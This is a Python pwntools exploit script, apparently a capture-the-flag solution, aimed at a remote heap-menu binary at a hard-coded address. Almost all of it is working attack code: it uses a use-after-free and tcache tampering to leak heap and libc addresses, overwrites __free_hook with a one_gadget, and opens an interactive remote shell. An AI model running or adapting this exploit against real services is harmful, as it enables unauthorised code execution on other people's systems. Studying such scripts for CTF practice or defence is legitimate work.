#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "123.56.236.86 26401"
remote_service = remote_service.strip().split(" ")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

def cho(choice):
	ru(b'your choice:\n')
	sl(i2b(choice))
def add_gift(choice, data):
	cho(2)
	cho(choice)
	ru(b'plz write your wish on your gift!\n')
	sn(data)
def delete_gift(idx):
	cho(3)
	ru(b'index?\n')
	sl(i2b(idx))
def show_gift(idx):
	cho(4)
	ru(b'index?\n')
	sl(i2b(idx))
def bargain(idx, num):
	cho(5)
	ru(b'index?\n')
	sl(i2b(idx))
	ru(b'How much?\n')
	sl(i2b(num))


add_gift(1, b'/bin/sh\x00'*0x2)
add_gift(1, b'a'*0x10)
delete_gift(0)
delete_gift(1)
show_gift(1)
ru(b'cost: ')
heap_base = int(ru(b'\n', "drop")) & 0xfffffffffffff000
lg("heap_base")
add_gift(2, p64(heap_base + 0x0)*2)
bargain(1, -0x230)

add_gift(1, b'a'*0x10)
add_gift(1, b'a'*0x10)
add_gift(1, (p64(0) + b'a'*8).ljust(0x68, b'\x00') + p64(heap_base + 0x380))
delete_gift(3)
show_gift(3)
ru(b'cost: ')
libc_base = int(ru(b'\n', "drop")) - 0x1e4ca0
free_hook = libc_base + l.symbols['__free_hook']
system = libc_base + l.symbols['system']
og = libc_base + 0x106ef8
lg("libc_base")
debugPID()


add_gift(1, p64(free_hook - 0x10)*4)
add_gift(2, b'aaa')
add_gift(2, p64(og)*4)
delete_gift(8)

# debugPID()
irt()
